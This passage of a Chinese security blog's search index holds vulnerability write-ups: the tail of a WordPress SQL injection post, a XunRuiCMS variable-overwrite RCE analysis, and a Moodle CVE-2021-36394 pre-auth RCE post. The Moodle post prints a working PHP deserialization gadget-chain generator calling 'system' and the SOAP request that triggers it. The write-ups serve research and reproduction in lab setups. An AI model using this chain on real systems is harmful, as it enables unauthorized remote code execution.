<code>$operator</code>为 <code>NOT IN</code>时，就会拼接 <code>SQL</code>语句，造成注入，进入其他分支也是可以的，都一样，后面就不用讲了。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><img src="1645371797533-b52f553e-d0e1-4afb-af14-b7fe762dd1f3.png" alt="image.png"></p><p>注意右下角的延时</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p><code>wordpress</code>的漏洞还是比较少的，尤其是这种核心漏洞，使用到这个函数的插件很容易受到影响，又很难受到影响，很容易是因为使用的插件还是很多的，很难是因为输入的参数存在转义，所以需要很多的凑巧才能成功利用，不过存在一个比较大的基数，找到受影响的应该不难，连续分析了两个 <code>wordpress</code>近期的漏洞，给我的感觉就是，大的系统不是没有漏洞，而是缺少挖到他的人。</p>]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>SQL注入漏洞</tag>
      
      <tag>CVE</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>WordPress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XunRuiCMS_变量覆盖导致的前台RCE</title>
    <link href="/2022/01/25/XunRuiCMS-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%89%8D%E5%8F%B0RCE/"/>
    <url>/2022/01/25/XunRuiCMS-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%89%8D%E5%8F%B0RCE/</url>
    
    <content type="html"><![CDATA[<p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>先后在两篇文章中看到了这个<code>cms</code>，利用方式感觉很有意思，遂跟着复现一波写下了这篇文章。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>影响在此修复之前的版本 </p><p><a href="https://gitee.com/dayrui/xunruicms/commit/80e2d8f3008384d926c64163b7334a260edc0a51">https://gitee.com/dayrui/xunruicms/commit/80e2d8f3008384d926c64163b7334a260edc0a51</a></p><p>此处测试环境为修复的前一个版本，可 git 下载后执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">git checkout fad7b01<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>我们可以根据修复记录来复现漏洞</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>首先定位到 <code>dayrui/Fcms/Core/View.php</code>的<code>display</code>方法，218 行存在一个 <code>extract</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;_options, EXTR_OVERWRITE);<br></code></pre></td></tr></table></figure><p>第二个参数为 <code>EXTR_OVERWRITE</code>，也就是可以覆盖已存在的变量，那么只要 <code>$this-&gt;_options</code>可控，我们就可以得到一个变量覆盖漏洞，因此寻找赋值的位置<br>同样在该文件</p><p><img src="1644246657397-22191b3d-1b41-4a65-8632-f86a52e8d5bc.png" alt="image.png"></p><p>从注释可以看到这个方法是用来设置模板变量的，这里将传入的第一个参数全部放入了 <code>$this-&gt;_options</code><br><code>dayrui/Fcms/Control/Api/Api.php</code>中的 <code>template</code>方法使用 <code>assign</code>来设置模板变量，并且参数可以通过 <code>GET</code>得到，因此可控，间接导致了 <code>$this-&gt;_options</code>可控，之后又进入 <code>display</code>方法，触发 <code>extract</code>，因此存在变量覆盖漏洞</p><p><img src="1644247366176-b26669e0-0b2c-4766-a3bb-5e67f99e4f89.png" alt="image.png"></p><p>现在继续跟进 <code>display</code>方法</p><p><img src="1644324477787-3e232cfe-ed7f-436a-9a9e-5ea191e654a7.png" alt="image.png"></p><p>由于存在变量覆盖漏洞，因此 <code>$phpcmf_name</code>和 <code>$phpcmf_dir</code>都可控，之后进入 <code>get_file_name</code>方法，两个参数都可控，这个方法就不跟进看了，最后得到的 <code>$_view_file</code>可控，继续往下走</p><p><img src="1644324685908-e4ac4fa3-e46e-481d-93ff-1bb4f60f9311.png" alt="image.png"></p><p><code>load_view_file</code>方法会根据 <code>$_view_file</code>生成一个 <code>cache file</code>并返回文件路径，最后包含该文件</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>现在我们需要找到一处可以命令执行的地方，而 <code>View.php</code>中有一个 <code>list_tag</code>方法</p><p><img src="1644326182325-98df5d65-533c-44fb-81f5-4eec886f4a5b.png" alt="image.png"></p><p>这里存在一个 <code>switch ... case ...</code>当 <code>$system[&#39;action&#39;]</code>为 <code>function</code>时就可以进入上面的分支，从而有机会被执行</p><p>在变量覆盖块，我们讲到了可以包含模板文件，我们可以选择 <code>dayrui/Fcms/View/api_related.html</code></p><p>生成 <code>cache</code>文件后包含，在被包含的文件中，我们可以找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">list_tag</span>(<span class="hljs-string">&quot;action=module module=<span class="hljs-subst">$mid</span> siteid=<span class="hljs-subst">$site</span> where=<span class="hljs-subst">$where</span> order=updatetime page=1 pagesize=<span class="hljs-subst">$pagesize</span> urlrule=<span class="hljs-subst">$urlrule</span>&quot;</span>);<br></code></pre></td></tr></table></figure><p>因此可以调用到 <code>list_tag</code>方法，并且可以用变量覆盖来控制参数，接下来我们进入 <code>list_tag</code></p><p><img src="1644326537174-64b2314c-eb4b-4c14-b1a5-030f46e3d5c5.png" alt="image.png"></p><p><code>$params</code>就是传进来的参数，也就是上面那一大串，部分为我们所控</p><p>这里使用 <code>explode</code>，按空格分割并写入数组，之后取出数组每一项用 <code>=</code>分割，分别得到 <code>$var</code>和 <code>$val</code>，最后如果存在 <code>$system[$var]</code>，就会用处理过的<code>$val</code>覆盖</p><p>因此我们可以利用可控的变量来覆盖 <code>$system[&#39;action&#39;]</code>从而进入 <code>function</code>分支，到后面就比较简单了，这里不多赘述。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>因为调用 <code>display</code>的地方使用了 <code>ob_start</code>，因此一般的命令都没有回显，所以使用的弹计算器的方式</p><p>自己弹了一下自己，只是我的计算器早就被我删了</p><p><img src="1644334744634-94e79d78-cf97-4ec2-a5a3-d576a8405421.png" alt="image.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>利用方式很有意思，但是有一点点复杂，有兴趣的话可以自己手调一下，会有更多的收获的，若是有什么疑问的地方，欢迎私聊交流讨论。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://xz.aliyun.com/t/10002">https://xz.aliyun.com/t/10002</a></li><li><a href="https://forum.butian.net/share/1072">https://forum.butian.net/share/1072</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>未授权漏洞</tag>
      
      <tag>RCE</tag>
      
      <tag>CNVD</tag>
      
      <tag>XunRuiCMS</tag>
      
      <tag>变量覆盖</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Moodle_3.11_前台RCE_CVE-2021-36394</title>
    <link href="/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/"/>
    <url>/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/</url>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/10383">https://xz.aliyun.com/t/10383</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p><code>Moodle</code> 是世界上最流行的学习管理系统。在几分钟内开始创建您的在线学习网站！</p><p><code>Moodle</code>的<code>Shibboleth</code>认证模块存在一个未授权远程代码执行漏洞。这在大学中被广泛使用，以允许来自一所大学的学生与其他大学进行身份验证，从而使他们能够参加外部课程并与其他人一起玩乐。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">11</span>, <span class="hljs-number">3</span>.<span class="hljs-number">10</span> to <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">4</span>, <span class="hljs-number">3</span>.<span class="hljs-number">9</span> to <span class="hljs-number">3</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span> and earlier unsupported versions<br></code></pre></td></tr></table></figure><p>需要开启 <code>Shibboleth</code> 认证模块</p><p>可以 <code>fofa</code> 查看其使用，可以看到有 <code>13w</code> 条 <code>moodle</code> 应用</p><p><img src="0.png" alt="202210262318380.png"></p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>为了省去一些麻烦，这里我已经搭建好了漏洞 <code>docker</code>，可以在这里找到 <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">CVE-2021-36394 Pre-Auth RCE in Moodle</a></p><p>执行如下操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>然后进入 <code>docker</code> ，更改文件 <code>/var/www/html/moodle-3.11.0/config.php</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">$CFG<span class="hljs-punctuation">-&gt;</span>wwwroot   = <span class="hljs-symbol">&#x27;http</span>:<span class="hljs-comment">//127.0.0.1&#x27;;</span><br></code></pre></td></tr></table></figure><p>将上面的链接改为自己的，必须是真实地址</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>根据作者 <a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">博客</a> 上讲的，此漏洞大概可分为三部分，<code>session</code> 文件写入，<code>moodle</code> 反序列化链，反序列化执行入口</p><h3 id="moodle-反序列化链"><a href="#moodle-反序列化链" class="headerlink" title="moodle 反序列化链"></a>moodle 反序列化链</h3><p>先来看反序列化链，这并没有在 <code>PHPGGC</code> 收录，所以需要自己找，这里提供一条的简单分析，对细节感兴趣的童鞋可以调试一下</p><p>首先是 <code>__destruct</code> 入口，位于 <code>lib/classes/lock/lock.php</code></p><p><img src="1.png" alt="202210262318380.png"></p><p>可以看到 <code>$key</code> 可控，并且在字符串中，因此可以触发 <code>__toString</code></p><p>我们选择 <code>availability/classes/tree.php</code> 中的 <code>__toString</code> ，如图</p><p><img src="2.png" alt="202210262318380.png"></p><p><code>$this-&gt;children</code> 可控，因此可以对象遍历，我们可以选一个可以让我们命令执行的类，选择 <code>lib/classes/dml/recordset_walk.php</code> 的 <code>core\dml\recordset_walk</code> ，因为这里有一个 <code>current</code> 方法可以 <code>call_user_func</code> ，并且参数可控</p><p><img src="3.png" alt="202210262318380.png"></p><p><code>$this-&gt;callback</code> 可控，<code>$resord</code> 由 <code>$this-&gt;recordset-&gt;current()</code> 得到，我们可以看到 <code>$this-&gt;recordset</code>  ，需要实现的方法有很多，结合定义可以知道，<code>$this-&gt;recordset</code> 必须实现 <code>Iterator</code> ，因此范围就可以缩得比较小，最终确定使用 <code>question/engine/questionusage.php</code> 中的 <code>question_attempt_iterator</code> 类，但这个类默认没有被加载，需要一个类作为中介，这里可以选择 <code>question/classes/external.php</code> 中的  <code>core_question_external</code></p><p>如此即可得到反序列化链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">lock</span> &#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">lock</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">key</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core_availability</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">tree</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">children</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">dml</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">recordset_walk</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">recordset</span> = $<span class="hljs-title class_">class</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callbackextra = <span class="hljs-literal">null</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callback = <span class="hljs-string">&quot;system&quot;</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">question_attempt_iterator</span>&#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">slots</span> = <span class="hljs-title class_">array</span>(<br>                &quot;<span class="hljs-title class_">xxx</span>&quot; =&gt; &quot;<span class="hljs-title class_">key</span>&quot;<br>            );<br>            <span class="hljs-variable language_">$this</span>-&gt;quba = <span class="hljs-variable">$class</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">question_usage_by_activity</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;questionattempts = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;whoami&quot;</span><br>            );<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">core_question_external</span></span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-variable">$add_lib</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">core_question_external</span>();<br>    <span class="hljs-variable">$activity</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_usage_by_activity</span>();<br>    <span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_attempt_iterator</span>(<span class="hljs-variable">$activity</span>);<br>    <span class="hljs-variable">$walk</span> = <span class="hljs-keyword">new</span> core\dml\<span class="hljs-title function_ invoke__">recordset_walk</span>(<span class="hljs-variable">$iterator</span>);<br>    <span class="hljs-variable">$tree</span> = <span class="hljs-keyword">new</span> core_availability\<span class="hljs-title function_ invoke__">tree</span>(<span class="hljs-variable">$walk</span>);<br>    <span class="hljs-variable">$lock</span> = <span class="hljs-keyword">new</span> core\lock\<span class="hljs-title function_ invoke__">lock</span>(<span class="hljs-variable">$tree</span>);<br><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$add_lib</span>, <span class="hljs-variable">$lock</span>);<br>    <br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="session-文件写入"><a href="#session-文件写入" class="headerlink" title="session 文件写入"></a>session 文件写入</h3><p>接下来我们要想办法将反序列化后的内容写入 <code>session</code> 文件</p><p>来到文件 <code>grade/report/grader/index.php</code> ，这是我们可以直接访问到的文件，来看看有什么处理</p><p><img src="202210262316088.png" alt="202210262316088.png"></p><p><code>required_param</code> 与 <code>option_param</code> 差不多，一个是必须，一个是可选，都是获取参数，这里可以看到 <code>id</code> 是必须的，且为 <code>int</code> 类型，其他的都是可选的，继续看下面的</p><p><img src="202210262316384.png" alt="202210262318380.png"></p><p>可以看到，<code>$graderreportsifirst</code> 与 <code>$graderreportsilast</code> 被写入了 <code>$SESSION</code> ，也就是上面的 <code>sifirst</code> 和 <code>silast</code>，而 <code>$SESSION</code> 是 <code>global</code> 修饰的，指向 <code>$GLOBALS[&#39;SESSION&#39;]</code> ，在 <code>lib/classes/session/manager.php</code> 中赋值</p><p><img src="202210262316167.png" alt="202210262318380.png"></p><p>默认 <code>session</code> 会存储在文件中，因此我们的反序列化 <code>payload</code> 就会被写入 <code>session</code> 的文件存储起来，但是存储进 <code>session</code> 文件的 <code>payload</code> 如何被成功反序列化呢？这就看最关键的下一部分</p><h3 id="反序列化执行入口"><a href="#反序列化执行入口" class="headerlink" title="反序列化执行入口"></a>反序列化执行入口</h3><p>反序列化执行的入口出在 <code>Shibboleth</code> 认证模块，需要管理者开启该认证模块才可以使用，默认是不开启的，因此降低了此漏洞的影响面，但全网存在的 <code>moodle</code> 系统实在是多，所以影响还是可以的。</p><p>来到 <code>auth/shibboleth/logout.php</code></p><p><img src="202210262317875.png" alt="202210262318380.png"></p><p>首先是获取了输入流赋值给 <code>$inputstream</code> ，当 <code>$inputstream</code> 不为空时，会使用 <code>soap</code> 来处理，<code>$server-&gt;handle()</code> 默认处理输入流中的数据， 构造如下 <code>xml</code> 数据流访问就可以访问到 <code>LogoutNotification</code> 函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">spsessionid</span>&gt;</span>xxxx<span class="hljs-tag">&lt;/<span class="hljs-name">spsessionid</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="202210262318745.png" alt="202210262318380.png"></p><p>这里会先获取 <code>session</code> 存储的方式，文件存储与数据库存储，默认为文件存储，这时会进入 <code>\auth_shibboleth\helper::logout_file_session($spsessionid);</code></p><p><img src="202210262318274.png" alt="202210262318380.png"></p><p>这里获取了 <code>session</code> 存储的位置，然后遍历所有文件，获取内容，最后进入 <code>self::unserializesession($data[0]);</code></p><p><img src="202210262318380.png" alt="202210262318380.png"></p><p>这里首先以 <code>|</code> 分割字符串，然后以2个为一组，将每组的第二个反序列化，这里就解决了第二部分的问题，可以构造包含 <code>|</code> 与 <code>payload</code> 的字符串，就可以成功反序列化 <code>payload</code> ，构造如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">aaaaaa|<span class="hljs-params">...</span><span class="hljs-params">...</span>payload<span class="hljs-params">...</span><span class="hljs-params">...</span>|bbbbbb<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>复现 <code>POC</code> 已上传 <code>github</code> <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">传送门</a> ，需要注意的是，这个命令执行是无回显的，这里借助 <code>ceye</code> 平台进行测试</p><p>使用 <code>docker-compose.yml</code> 搭建环境</p><p>使用 <code>moodle_unserialize_rce.php</code> 生成反序列化字符串</p><p><img src="202210262318746.png" alt="image-20211017175905534.png"></p><p>使用 <code>moodle_rce.py</code> 进行测试</p><p><img src="202210262318747.png" alt="image-20211017180115851.png"></p><p>查看 <code>ceye</code> 平台</p><p><img src="202210262318748.png" alt="image-20211017180256269.png"></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1&#x2F;</a></li><li><a href="https://github.com/dinhbaouit/CVE-2021-36394">https://github.com/dinhbaouit/CVE-2021-36394</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>CVE</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>RCE</tag>
      
      <tag>Moodle</tag>
      
      <tag>未授权访问</tag>
      
      <tag>PHP反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
